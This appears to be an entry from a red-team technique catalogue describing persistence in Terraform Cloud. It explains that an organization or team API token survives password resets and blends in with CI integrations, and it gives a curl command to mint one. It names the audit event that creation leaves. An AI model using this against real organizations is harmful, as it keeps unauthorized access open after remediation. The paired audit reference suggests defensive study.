---
id: tfc-token-backdoor
title: Terraform Cloud org/team token backdoor (durable API access)
section: Terraform Cloud / IaC
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098]
platform: [terraform]
source: Terraform Cloud persistence (org/team API token)
pair: tfc-token-audit
---

Mint an **organization** (or **team**) API token: a long-lived, non-interactive
credential that drives the full Terraform Cloud API — queue runs, read/write variables,
pull state — and keeps working after the compromised user's password/session is reset.
It blends in among legitimate CI integrations. Creating one writes a
`resource.type=authentication_token` `resource.action=create` audit event. (IaC control
plane — no slots.)

```sh
# mint an org API token for durable Terraform API + state access (team token: /teams/<id>/...)
curl -s -H "Authorization: Bearer <token>" -X POST \
  "https://app.terraform.io/api/v2/organizations/<org>/authentication-token"
```
